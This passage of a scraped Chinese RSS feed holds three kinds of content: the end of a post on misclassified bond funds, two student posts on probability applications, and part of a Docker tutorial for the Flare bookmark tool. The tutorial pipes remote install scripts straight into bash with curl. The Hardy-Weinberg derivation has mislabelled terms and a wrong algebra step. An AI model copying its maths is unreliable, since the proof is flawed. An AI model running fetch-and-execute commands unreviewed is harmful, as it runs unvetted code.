(2008), Evans and Sun (2018), Reuter and Zitzewitz (2015), Ben-David et al. (2019)). CCG(2021)发现，与同风险类别基金相比，被错误分类的基金在平均水平上多获得了0.17 至 0.38颗晨星星级评级。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-ccd3fb0a584895da30a5e8dce4b4cd1a_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1444\" data-rawheight=\"1124\" class=\"origin_image zh-lightbox-thumb\" width=\"1444\" data-original=\"https://pic3.zhimg.com/v2-ccd3fb0a584895da30a5e8dce4b4cd1a_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p data-pid=\"dTdI2ih6\">   他们也发现，<b>因为被错误分类的基金可以获得更高的晨星评级，从而会提高他们的费率，向投资者收取更高的费用</b>，实证结果显示被错误分类的基金会比它们同风险类别的其他基金多收取7.6个基点的年费率，最后发现，被错误分类的基金会比同类型基金高出12%的可能获得正向的现金流。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-ae71e40f60a6bb94721b4bfb7a31bea2_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"896\" class=\"origin_image zh-lightbox-thumb\" width=\"1440\" data-original=\"https://pic3.zhimg.com/v2-ae71e40f60a6bb94721b4bfb7a31bea2_r.jpg\"></figure><p data-pid=\"gCuOVPVD\"><b>References</b></p>\n<p data-pid=\"mGDpuxY9\">Ben-David, Itzhak, Jiacui Li, Andrea Rossi, and Yang Song, 2019, What do mutual fund investors really care about? Fisher College of Business Working Paper No. 2019-03-005.</p>\n<p data-pid=\"x8ilE8_4\">Chen, Huaizhi and Cohen, Lauren and Gurun, Umit G.,2021, Don't Take Their Word for It: The Misclassification of Bond Mutual Funds. The Journal of Finance, 76: 1699-1730.</p>\n<p data-pid=\"ZfTQQLAc\">Del Guercio, Diane, and Paula A. Tkac, 2008, Star power: The effect of Morningstar ratings on mutual fund flow, <i>Journal of Financial and Quantitative Analysis</i> 43, 907–936.</p>\n<p data-pid=\"_oPTqrbh\">Evans, Richard B., and Yang Sun, 2018, Models or stars: The role of asset pricing models and heuristics in investor risk adjustment, Working paper, University of Virginia.<br><br>Reuter, Jonathan, and Eric Zitzewitz, 2015, How much does size erode mutual fund performance? A regression discontinuity approach, Working paper, Boston College.</p>\n<p data-pid=\"92jJkUfa\"><b>免责声明</b>：本文在任何情况下都不代表投资建议。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/NanCy_love?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">小艾同学丿L</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/424685116?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"概率的应用Ⅰ: 随机应答问卷调查(Randomised Response Survey) 和 哈迪温伯格定律(Hardy-Weinberg Law)","date":"2022-02-20 03:08:16","description":"\n<p data-pid=\"ul-up3ke\">统计学是计量经济学的基础， 而概率学又是统计学的基石。</p>\n<p data-pid=\"a8f4180V\">概率学和统计学最大的区别在于，概率推测不确定时间长期的可能性，而统计则完全相反，我们先收集结果后推测过程。</p>\n<p data-pid=\"TmIIvBK1\">举一个具体例子：</p>\n<p data-pid=\"7CAmdO_C\">假设有一个桶，里面有一些红色的珠子和一些黑色的珠子。概率学家知道里面各有多少珠子，想要找出抽到一个红色珠子的可能性。而统计学家则需要从桶里拿出一些珠子来计算桶里红色珠子的比率。</p>\n<p data-pid=\"1-wOuBGe\">说真的，学习统计和概率总是让我很头疼，因为内容太枯燥了，每次上课只学理论就会觉得很无聊。不过统计和概率的真正意义在于应用，每次做题就能理解好多上课没听懂的理论。</p>\n<p data-pid=\"76OkkfsX\">因为这学期主要在学概率，今天就来和大家分享两个概率的实际应用，希望大家也能在概率里找到乐趣。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p data-pid=\"moY7N9PF\">1 ) 随机应答问卷调查 (Randomised Response Survey)</p>\n<p data-pid=\"kppssfq9\">有时候研究人员做实验，如果调查问卷里有一些比较私人或者敏感的问题，人们可能为了面子会给出与事实不相符的答案。举一个十分典型又日常的例子，当初看《非诚勿扰》的时候，男嘉宾播放VCR介绍自己的感情经历，大多数都会说自己曾经有过3段情感经历，几乎很少会有男嘉宾会多过这个数字，可事实确实如此吗？这个答案也是不得而知了。</p>\n<p data-pid=\"ReY3XzvN\">研究人员为了避免这个问题，在问卷调查中得出确实的答案，想到了一个办法：Randomised Response Technique (Warner, 1965, Journal of American Statistical Association)</p>\n<p data-pid=\"PEK6gX8L\">假如我们想要做一个问卷调查：你是否进入过异性厕所？</p>\n<p data-pid=\"F3-yZG8F\">样本量，n = 100</p>\n<p data-pid=\"aNMqXKqy\">一般人们的回答是：</p>\n<p data-pid=\"iwj0Fjq_\">a) 我进过异性厕所</p>\n<p data-pid=\"jwNuk_xk\">b) 我没有进过异性厕所</p>\n<p data-pid=\"5eBlgwo_\">不同于一般直接让人们回答这个问题，现在我们将(a) 和 (b) 按照一定比率发给被调查者，然后被调查者根据他们拿到的(a) 或(b)来回答是或不是。</p>\n<p data-pid=\"E7nuVWQT\">这样一来我们就能得到被调查者的真实答案，因为调查人员最终得到的结果只有是或不是，而调查人员也不知道结果对应的是(a)或(b)哪一句。</p>\n<p data-pid=\"qJ4FikJ-\">假设，按8:2的比率发出(a)和(b)两个句子，我们能得到一个概率树。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-d111e003369698af1591805eb47adc60_b.png\" data-rawwidth=\"779\" data-rawheight=\"397\" class=\"origin_image zh-lightbox-thumb\" width=\"779\" data-original=\"https://pic1.zhimg.com/v2-d111e003369698af1591805eb47adc60_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-3165c1a57281efdb3d37c02e8e8da182_b.png\" data-rawwidth=\"800\" data-rawheight=\"350\" class=\"origin_image zh-lightbox-thumb\" width=\"800\" data-original=\"https://pic3.zhimg.com/v2-3165c1a57281efdb3d37c02e8e8da182_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p data-pid=\"ERBPjcTc\">这样我们就能得到 <img src=\"https://www.zhihu.com/equation?tex=%5Cpi\" alt=\"\\pi\" eeimg=\"1\"> , “我进过异性厕所的”总概率，确保了数据获取的准确率。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p data-pid=\"Jeqmz2I0\">2) 哈迪温伯格定律(Hardy-Weinberg Law)</p>\n<p data-pid=\"72t-xtay\">“哈迪温伯格定律”是生物学和遗传学中概念，指在理想状态下，各等位基因的频率和等位基因的基因型频率在遗传中是稳定不变的，即保持着基因平衡。</p>\n<p data-pid=\"g61FVGK6\">假设这世界上有两种染色体A和a，所以我们会得到AA, Aa 和 aa 三种基因组合。3种基因各有p, q, r比率。</p>\n<p data-pid=\"DSRDeEYe\">下一代的基因组成是从父母的基因中各拿一个染色体，组成一对。</p>\n<p data-pid=\"odKjCboC\">假设第二代AA, Aa 和 aa 三种基因的比率分别为p’, q’, r’。</p>\n<p data-pid=\"h55ggd9a\">哈迪温伯格定律解释说AA, Aa 和 aa, 的比率将一直是p’, q’, r’， 不变。 </p>\n<p data-pid=\"M4ewh8j4\">假设从父母中继承到A或a的概率和在总人口中抽取A或a的概率是相同的。</p>\n<p data-pid=\"XGKyi_59\">P(A) = P( A|AA ) * P( AA ) + P( A| aa ) * P( aa ) + P( A| Aa ) * P( Aa )</p>\n<p data-pid=\"IR-PHAdM\">        = 1 * p + 0 * q + 0.5 * r</p>\n<p data-pid=\"RpygAxRH\">        = p + 0.5r</p>\n<p data-pid=\"M8Cfv8mV\">同理可得 P(a) = q + 0.5r</p>\n<p data-pid=\"vaL12487\">第二代的p’, q’, r’ 比率即为</p>\n<p data-pid=\"eazglFNr\">p’ = P(A) * P(A) = (p + 0.5r)^2</p>\n<p data-pid=\"o-i4E2i_\">q’ = P(A) * P(a) = (q + 0.5r)^2</p>\n<p data-pid=\"EvVEqWhV\">r = 2 * P(A) * P (a)</p>\n<p data-pid=\"rilGx3ke\">  = 2(p +0.5r) (q + 0.5r)</p>\n<p data-pid=\"FtQt-fMF\">第二代中有A 的可能性为</p>\n<p data-pid=\"E7lU-EqV\">P(A) = P( A|AA ) * P( AA ) + P( A| aa ) * P( aa ) + P( A| Aa ) * P( Aa )</p>\n<p data-pid=\"Gzyn9xtb\">        = 1 * p’ + 0 * q’ + 0.5 * r’</p>\n<p data-pid=\"cCd1u0Uo\">        = p’ + 0.5r’</p>\n<p data-pid=\"zpBqXOB0\">        = (p + 0.5r)^2 + 2(p + 0.5r) (q + 0.5r)</p>\n<p data-pid=\"q9Hs7NBG\">        = p + 0.5r (和第一代结果相同)</p>\n<p data-pid=\"RfFLRcaP\">这样就从概率的角度证明了哈迪温伯格定律。</p>\n<p data-pid=\"cWH_Kc1g\">今天和大家分享了两个概率的应用，让我们认识到概率的应用范围十分广泛，可以跨越不同领域涉及到生物学，对实验研究，收取数据也很有帮助。希望我在学习概率的路上能学到各种有趣的应用，也和大家一起分享，一起了解概率，喜欢概率。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p data-pid=\"FNDOrTfE\">注：第一次在知乎上发文，对如何输入公式不是很熟悉，这次的格式不是很整齐，下一次会注意的</p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/lucia-90-71?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">Lucia</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/28969179?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"概率的应用Ⅱ：赌徒破产问题 (Gambler's Ruin Problem) 和 赛车投注 (Motor Racing Betting)","date":"2022-02-20 03:08:09","description":"\n<p data-pid=\"-kDe4DvN\">既然我们要说概率，那么赌博相关的问题一定是必不可少的了。今天就分享两种比较常见，易理解的赌博概率计算方法。希望大家看了以后能对赌博有更多了解，理性赌博。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p data-pid=\"ugWywpZ3\">1) 赌徒破产问题 (Gambler's Ruin Problem)</p>\n<p data-pid=\"2d9a_reb\">A和B两个赌徒，各选择硬币的一面：如果过正面朝上，A赢，B给A一块钱；反面朝上，B赢，A给B一块钱。两人一直这样不停地赌博，当其中一方的钱全输光时，游戏结束。</p>\n<p data-pid=\"EpDEBkUw\">正面朝上的可能性是 p, 反面朝上的可能性是 q=1-p</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p data-pid=\"6a7JYTjT\">问题：A赢得全部的钱的概率是多少？</p>\n<p data-pid=\"0dQWk6Hg\">设，A一开始有 i 块钱， B有 (N-i) 块钱，即 N 为A和B开场资金的总和。</p>\n<p data-pid=\"VYxIHMgP\">设 <img src=\"https://www.zhihu.com/equation?tex=P_%7Bi+%7D\" alt=\"P_{i }\" eeimg=\"1\"> 为在A有 i 块的时候，A赢走所有钱的可能性。</p>\n<p data-pid=\"I_I_Kjbn\">这道题的关键是要理解下面这个公式：</p>\n<p data-pid=\"T6tCjeCR\"><img src=\"https://www.zhihu.com/equation?tex=P_%7Bi%7D+%3D+p+%5Ctimes+P_%7Bi%2B1%7D+%2B+q+%5Ctimes+P_%7Bi-1%7D\" alt=\"P_{i} = p \\times P_{i+1} + q \\times P_{i-1}\" eeimg=\"1\"></p>\n<p data-pid=\"KitvkAJz\">假设 i = 3， <img src=\"https://www.zhihu.com/equation?tex=P_%7B3+%7D\" alt=\"P_{3 }\" eeimg=\"1\"> 代表在A有3块钱的时候，能赢下所有钱的可能性。这个可能性要怎么算呢？</p>\n<p data-pid=\"cbyAfaqZ\">我们要用到全概率公式(Law of Total Probability). 这个公式的右手边可以解读为： P(A 赢下所有钱|A赢了下一局，即A有4块钱) <img src=\"https://www.zhihu.com/equation?tex=%5Ctimes+\" alt=\"\\times \" eeimg=\"1\"> P(A赢了下一局) <img src=\"https://www.zhihu.com/equation?tex=%2B+\" alt=\"+ \" eeimg=\"1\">  P(A 赢下所有钱|A输了下一局，即A有2块钱) <img src=\"https://www.zhihu.com/equation?tex=%5Ctimes\" alt=\"\\times\" eeimg=\"1\"> P(A输了下一局)</p>\n<p data-pid=\"zjeZ7UAf\">所以我们得到了 <img src=\"https://www.zhihu.com/equation?tex=p%5Ctimes+P_%7Bi%2B1%7D+%2B+q+%5Ctimes+P_%7Bi-1+%7D\" alt=\"p\\times P_{i+1} + q \\times P_{i-1 }\" eeimg=\"1\"></p>\n<p data-pid=\"aWdomokD\">同时我们也知道 <img src=\"https://www.zhihu.com/equation?tex=P_%7B0%7D%3D0\" alt=\"P_{0}=0\" eeimg=\"1\"> , <img src=\"https://www.zhihu.com/equation?tex=P_%7BN%7D+%3D+1+\" alt=\"P_{N} = 1 \" eeimg=\"1\"></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p data-pid=\"V7j9wxz1\">如果N比较小的话，我们可以得到一个方程租，只要解出 <img src=\"https://www.zhihu.com/equation?tex=P_%7Bi%7D\" alt=\"P_{i}\" eeimg=\"1\"> 就好了</p>\n<p data-pid=\"BSpJcfvc\">比如说，我们套到另一道题里，A和B玩游戏，当A赢的局数比B多出2，游戏结束。</p>\n<p data-pid=\"ZSR1EZ0S\">p为A每一盘赢的可能性，q为B每一盘赢的可能性。p+q=1</p>\n<p data-pid=\"oQvdoOLA\">这里我们就要把 赢得局数 看成钱，得到以下方程组：</p>\n<p data-pid=\"kLE7T5fr\"><img src=\"https://www.zhihu.com/equation?tex=P_%7B1%7D+%3D+1%5Ctimes+p+%2B+P_%7B0%7D+%5Ctimes+q+\" alt=\"P_{1} = 1\\times p + P_{0} \\times q \" eeimg=\"1\"></p>\n<p data-pid=\"VUIQzJFx\"><img src=\"https://www.zhihu.com/equation?tex=P_%7B0%7D+%3D+P_%7B1%7D%5Ctimes+p+%2B+P_%7B-1%7D+%5Ctimes+q+\" alt=\"P_{0} = P_{1}\\times p + P_{-1} \\times q \" eeimg=\"1\"></p>\n<p data-pid=\"iaYem6Bv\"><img src=\"https://www.zhihu.com/equation?tex=P_%7B-1%7D+%3D+P_%7B0%7D%5Ctimes+p+%2B+0+%5Ctimes+q+\" alt=\"P_{-1} = P_{0}\\times p + 0 \\times q \" eeimg=\"1\"></p>\n<p data-pid=\"ddhgYZbC\">解出 <img src=\"https://www.zhihu.com/equation?tex=P_%7B0%7D+%3D+%5Cfrac%7Bp%5E%7B2%7D%7D%7B1-2p%281-p%29%7D+\" alt=\"P_{0} = \\frac{p^{2}}{1-2p(1-p)} \" eeimg=\"1\"></p>\n<p data-pid=\"6-KM7bti\">如果N很大的话，我们可以列出一些式子，然后简化，得出：</p>\n<p data-pid=\"N-0n8IhK\"><img src=\"https://www.zhihu.com/equation?tex=P_%7Bi%7D%3D%5Cfrac%7B1-%28q%2Fp%29%5E%7Bi%7D%7D%7B1-%28+q%2Fp%29%5E%7BN%7D%7D\" alt=\"P_{i}=\\frac{1-(q/p)^{i}}{1-( q/p)^{N}}\" eeimg=\"1\">  如果 <img src=\"https://www.zhihu.com/equation?tex=p%5Cne0.5\" alt=\"p\\ne0.5\" eeimg=\"1\"></p>\n<p data-pid=\"kv6CgUFL\"><img src=\"https://www.zhihu.com/equation?tex=P_%7Bi%7D+%3D+%5Cfrac%7Bi%7D%7BN%7D\" alt=\"P_{i} = \\frac{i}{N}\" eeimg=\"1\">  如果 <img src=\"https://www.zhihu.com/equation?tex=p+%3D+0.5+\" alt=\"p = 0.5 \" eeimg=\"1\"></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p data-pid=\"CncLCgnD\">2) 赛车投注 (Motor Racing Betting)</p>\n<p data-pid=\"ea1xv5Xb\">足球、赛马、F1赛车博彩大家都听说过，每当到了赛季，有些粉丝或是赌徒就按捺不住，想支持自己喜欢的选手或是队伍，也从中或利益比。想想，如果自己喜欢的球队赢了，同时也发了笔小财，真的是喜上加喜的好事啊。可是大家有没有思考过，博彩公司是怎么盈利的？我们的收益又是如何算出来的？今天和大家简单解释一下。</p>\n<p data-pid=\"d7b-AYU9\">假如一个赛车比赛里有5位赛车手，每一位赛车手的总投注分别为：</p>\n<figure><img src=\"https://pic4.zhimg.com/v2-bccef84980d504537bf6e8a3c123f273_b.png\" data-rawwidth=\"394\" data-rawheight=\"229\" class=\"content_image\" width=\"394\"></figure><p data-pid=\"KgLy1llP\">假设，博彩公司先拿走总投注里的10%(9百万)，作为收入，博彩公司就觉得不会亏了。</p>\n<p data-pid=\"_WpI2fGr\">剩下的钱就会是赌民的盈率</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-48c3c0285098e2f2b968dfed70fb805a_b.png\" data-rawwidth=\"587\" data-rawheight=\"227\" class=\"origin_image zh-lightbox-thumb\" width=\"587\" data-original=\"https://pic3.zhimg.com/v2-48c3c0285098e2f2b968dfed70fb805a_r.jpg\"></figure><p data-pid=\"1jGxgicW\">5.40的盈率表示，如果一个人在赌了10块钱A会赢，A赢的时候得到10 <img src=\"https://www.zhihu.com/equation?tex=%5Ctimes+\" alt=\"\\times \" eeimg=\"1\">  5.4 = 54块钱的回报，A没赢就会输掉所有的10块钱。</p>\n<p data-pid=\"JL6BUd4E\">所以说，不管怎么样，博彩公司是一定会盈利的，不然人家的生意也没办法做下去。</p>\n<p data-pid=\"5h5lOdJF\">当然，我相信事实的情况肯定会比这复杂得多，我也只是从一个简单的概率角度，解释了一下博彩公司的操作。所以大家有什么见解，我写的有什么不足的地方可以一起讨论，一起学习啊。</p>\n<p data-pid=\"Nn6OLf1y\">小赌怡情，大赌伤身。赌博这种事很多人就是追求的是多巴胺分泌，带来的那种亢奋的感觉。为了追求这种感觉，大家偶尔乐一乐就好。毕竟那种亢奋感只是一时的，回归现实，我们可以把这些时间金钱用在更有意义的地方，不仅让自己开心，也给别人带来快乐。</p>\n<p data-pid=\"49b0ECsl\">赌博要克制，呼吁大家理性赌博。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/lucia-90-71?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">Lucia</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/29406623?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"不满意于现有书签工具，我做了一个专属自己的网址导航","date":"2022-02-20 03:08:06","description":"\n<h2>写在前面</h2>\n<p>几月前，我开始重建 PKM（个人信息管理）系统，其中有一个环节就是浏览器书签的管理。</p>\n<p>实话说，我对于现有的书签程序并不是特别满意，主要因为它们都不能同时满足我的以下几个预期：</p>\n<ul>\n<li>我希望这个工具能够<strong>更高效和更简单</strong>，而不是只有极少数内容在书签栏呈现，更多的内容需要在层层「文件夹」中翻找；或者需要绞尽脑汁，通过在搜索栏中碰运气，看看能不能靠关键词和自动补全来匹配出具体内容。猜测和翻找都太浪费时间了。实际上，正如我在 <a href=\"https://soulteary.com/2022/02/08/building-bookmark-navigation-for-homelab-with-docker.html\" target=\"_blank\">之前一篇文章</a> 中所提及，在使用 Chrome 的十几年里，上千个书签慢慢的出现在了收藏夹里，然后和现实中放在书柜里的书一样，蒙上了厚厚的灰尘。</li>\n<li>我希望书签数据都是<strong>私有化的、少一些不确定因素</strong>。 作为一个使用了各种互联网产品二十多年的「年轻人」，我看到过太多工具和公司的生生死死、浮浮沉沉。 不少在线服务和软件背后的公司慢慢变成了时间长河里的一粒沙，在产品和公司陨落的过程中，用户的数据则经常变成陪葬品。 <strong>数据随着产品一起消失，这是我不愿意看到的</strong>。</li>\n<li>我希望书签工具是<strong>通用</strong>的。书签数据不应该掺和浏览器打架，也跟着玩「生殖隔离」。 即使我绝大多数情况下只用 Chrome，但是我依旧希望在我打开 Safari 的时候，也能够用鼠标「指指点点」这些书签，快速的到达我想要去的地方。 （我知道有浏览器之间的书签导入功能，但持保留态度，因为曾经在迁移的时候出现「书签大乱斗」「书签影分身」这类意外。）</li>\n</ul>\n<p>在尝试了使用各种软件之后，我偶遇了一个波兰程序员小哥的项目 <a href=\"https://github.com/pawelmalak/flame\" target=\"_blank\">Flame</a>。这是一款个人网址导航制作工具，你可以用它将常用的书签和在线应用制成一个美观的本地页面。</p>\n<p>不过，Flame 也并不完全符合我的预期。在深入使用这个软件，重构了一部分代码、封装了容器应用，并提交了几个 PR 之后，我想清楚了我到底要的是什么。于是我决定自己动手，基于 Flame 制作了一个外观和功能相仿，但性能更高、数据更透明、使用起来更简单的书签导航工具——Flare。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/08/article/dc0266a8b7fa20cacdf7e258b38388e8?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" alt=\"我当前使用的书签导航工具界面\"></figure><p>与原版相比，Flare 保留了美观的界面，但有很大的性能优势：容器镜像体积不到 10MB，内存占用通常低于 30MB，即使添加上千条书签也能「秒开」（每秒 4800—5000 的并发请求下，依旧可以在 1—2 毫秒内打开页面），在笔记本上也不会引发风扇狂转。事实上，Flare 在前端工具的测试中可以拿到满分的成绩，甚至可以跑在一台成本差不多 50 元、搭载 2015 年 S805 芯片的 ARM 盒子上。</p>\n<p>此外，我进一步精简了数据存储和网络活动，用纯文本格式来存储书签，并将联网限制在天气展示这唯一一个场景（也可以 <a href=\"https://github.com/soulteary/docker-flare/issues/4#issuecomment-1041178633\" target=\"_blank\">完全禁用网络操作</a>）。（当然，除了上面这些内容之外，还有一些很小的细节，就留给好奇的你来探索啦！）</p>\n<p>接下来，我就想为你介绍如何快速通过 Docker 部署 Flare，从而拥有一个轻巧、美观、受自己掌控的个人书签导航应用。</p>\n<p><strong>注：</strong> 本文行文考虑到了不同水平的读者：如果你熟悉 Docker，那么将能够在十分钟内拥有属于自己的书签导航；如果你是一个新手，也没关系；跟着文章一步步操作，大概半个小时，相信你也能够将 Flare 运行起来，顺带熟悉 Docker 的使用，步入容器世界的大门。</p>\n<h2>快速安装和使用指南</h2>\n<p>Flare 的使用方式灵活，丰俭由人。全面起见，我会将常用的方式都讲解一遍，读者根据个人情况选择一种顺手的即可。</p>\n<h3>准备运行环境：安装 Docker</h3>\n<p>如上所述，Flare 的下载和安装依赖 Docker。</p>\n<p>Docker 的具体安装和配置方式超出了本文的讨论范围，这里只简单提及。如果你是 Mac 或 Windows 用户，最推荐的安装方法还是使用官方的 <a href=\"https://www.docker.com/products/docker-desktop\" target=\"_blank\">桌面版</a> 安装包。如果你用 Linux，相信已经对于命令行的包管理有所熟悉；当然，初学者也可以考虑使用我做的两个简单脚本，分别用来快速安装和初始化 Docker 和常用工具 <code>docker-compose</code>，运行下列命令即可（<strong>注：</strong>正如在将任何脚本导入终端前应当做的，请先审阅一遍 <a href=\"https://github.com/soulteary/Home-Network-Note/tree/master/scripts\" target=\"_blank\">源文件</a>）：</p>\n<pre class=\"language-Bash\"><code># 安装 Docker\ncurl -sL https://github.com/soulteary/Home-Network-Note/raw/master/scripts/install-docker.sh | bash\n# 国内服务器可改用下列使用国内镜像源的版本\n# curl -sL https://github.com/soulteary/Home-Network-Note/raw/master/scripts/install-docker-cn.sh | bash\n\n# 安装 Docker Compose\ncurl -sL https://github.com/soulteary/Home-Network-Note/raw/master/scripts/install-compose.sh | bash\n# 国内服务器可改用下列使用国内镜像源的版本\n# curl -sL https://github.com/soulteary/Home-Network-Note/raw/master/scripts/install-compose-cn.sh | bash</code></pre>\n<h3>使用 Docker 快速试用 Flare</h3>\n<p>在 Docker 环境就绪之后，我们可以通过一条简单的命令启动 Flare：</p>\n<pre class=\"language-Bash\"><code>docker run --rm -it -p 5005:5005 -v `pwd`/app:/app soulteary/flare:0.2.7</code></pre>\n<p>这条命令将拉取 Flare 的镜像，将其运行在本地的 <code>5005</code> 端口上，并将当前目录下的 <code>app</code> 目录作为数据存储路径。你可以根据自己的需求更换这些参数。例如希望软件能够换个 <code>8080</code> 端口运行，可以将运行参数修改为：</p>\n<pre class=\"language-Bash\"><code>docker run --rm -d -p 8080:5005 -v `pwd`/app:/app soulteary/flare:0.2.7</code></pre>\n<p>当命令执行完毕，我们将能看到类似下面的日志输出：</p>\n<pre class=\"language-Bash\"><code>2022/02/17 22:56:46 用户未指定 `FLARE_USER`，使用默认用户名 flare\n2022/02/17 22:56:46 用户未指定 `FLARE_PASS`，自动生成应用密码 [...]\n[...]\n2022/02/17 22:56:46 应用已启动 🚀\n[...]</code></pre>\n<p>这个时候，我们在浏览器中打开 <code>http://localhost:5005</code>，就能够看到书签导航页面了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/20/article/94c20deefa17ee5ea598bf74c8f2fee0\"></figure><h3>基本使用和配置</h3>\n<p>为了方便你了解和使用 Flare，我制作了一个小向导，只需要在原来的地址后面加上 <code>/guide</code> 即可访问：<code>http://localhost:5005/guide</code>。你可以通过这个向导了解 Flare 的基本功能布局。</p>\n<p>接下来，就该为 Flare 增加自己所需的链接、显示自己所在城市的天气了。</p>\n<p>如上所述，<strong>Flare 的配置都通过本地文件完成。</strong>初次运行后，查看当前目录，可以看到新出现了如下结构的目录和文件：</p>\n<pre class=\"language-Bash\"><code>app\n├── apps.yml\n├── bookmarks.yml\n└── config.yml</code></pre>\n<p>这些就是分别存储着网页应用书签、普通网址书签以及程序配置的数据文件啦，请注意妥善保存和备份。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/08/article/70597f543180f8dca9b7e8dbf80d2306?imageView2/2/w/1120/q/90/interlace/1/ignore-error/1\" alt=\"Flare 的数据文件示例\"></figure><p>Flare 的配置和数据都以 <a href=\"https://yaml.org/\">YAML</a> 格式保存，可以通过纯文本编辑器直观地修改；在刷新浏览器页面后，Flare 中的内容也会同步更新。</p>\n<p>例如，如果我想在 Flare 的「应用」模块增加 Evernote 和 Gmail 的快捷方式，则可以编辑 <code>apps.yml</code> 文件，在其中写上：</p>\n<pre class=\"language-YAML\"><code>links:\n- name: Evernote\n  desc: Evernote 笔记\n  link: https://www.evernote.com\n  icon: evernote\n- name: Gmail\n  desc: Gmail 邮件\n  link: https://mail.google.com\n  icon: gmail\n# [... 其他需要添加的快捷方式]</code></pre>\n<p>其中，每个快捷方式均可以指定标题（<code>name</code>）、描述文字（<code>desc</code>）、链接（<code>link</code>）和图标（<code>icon</code>）。<strong>图标的名称</strong>可以从 <a href=\"https://materialdesignicons.com/\" target=\"_blank\">Material Design Icon</a> 网站检索。</p>\n<p>「书签」模块的配置（<code>bookmarks.yml</code>）类似，区别在于多了链接分类，在开头的 <code>categories:</code> 下配置：</p>\n<pre class=\"language-YAML\"><code>categories:\n- id: cate-id-name-0\n  title: \"链接分类 1\"\n- id: cate-id-name-1\n  title: \"链接分类 2\"\n# [... 其他需要添加的分类]</code></pre>\n<p>此外，书签模块中的每个链接只有图标和名称，没有描述文字。</p>\n<p>最后，在 <code>config.yml</code> 中，可以对如下内容：</p>\n<ul>\n<li>\n<strong>天气</strong>的开关（<code>ShowWeather</code>）和城市（<code>Location</code>），</li>\n<li>\n<strong>标题</strong>（<code>Title</code>）、<strong>欢迎词</strong>（<code>Greetings</code>）和<strong>页脚文字</strong>（<code>Footer</code>），</li>\n<li>是否<strong>在新标签打开应用</strong>（<code>OpenAppNewTab</code>）和<strong>链接</strong>（<code>OpenBookmarkNewTab</code>），</li>\n<li>是否<strong>显示应用</strong>（<code>ShowApps</code>）和<strong>书签</strong>（<code>ShowBookmarks</code>）模块</li>\n</ul>\n<p>等进行设置；根据配置项的名称一看便知，在此不赘述。</p>\n<h3>使用 Docker Compose 运行</h3>\n<p>上面的一句话命令固然方便，但终归还是适合尝鲜。如果想要长久使用，每次输入这样的命令就不太方便了。</p>\n<p>为此，我们需要用到 Docker Compose。这是用配置文件来定义和运行一个或多个 Docker 应用的辅助工具，类似于一种「食谱」。与手打 Docker 命令相比，它的好处是基于明确的配置文件，可以细粒度地设置应用的功能，而无需记忆各种麻烦的参数。</p>\n<p>Docker Compose 使用的配置文件称为「Compose 文件」，本质上也是 YAML 格式。例如，下面这段简短的 Compose 文件就能用来运行 Flare：</p>\n<pre class=\"language-YAML\"><code>version: '3.6'\nservices:\n  flare:\n    image: soulteary/flare:0.2.7\n    restart: always\n    command: flare\n    ports:\n      - 5005:5005\n    volumes: \n      - ./app:/app</code></pre>\n<p>上面的配置只用了十行左右的代码，就完成了启动、端口和存储映射、进程守护和自动重启的作用，是不是有点「真香」的味道呢。</p>\n<p>当然，为了小伙伴更好的使用，Flare 还支持自主决定是否需要登录、是否自行指定用户名和密码；这都可以通过修改 Compose 文件中的命令（command）和环境变量（environment）来实现。具体请参看我制作的 <a href=\"https://github.com/soulteary/docker-flare/blob/main/docker-compose.yml\" target=\"_blank\">完整配置文件范例</a> 和其中的注释。</p>\n<p>写好 Compose 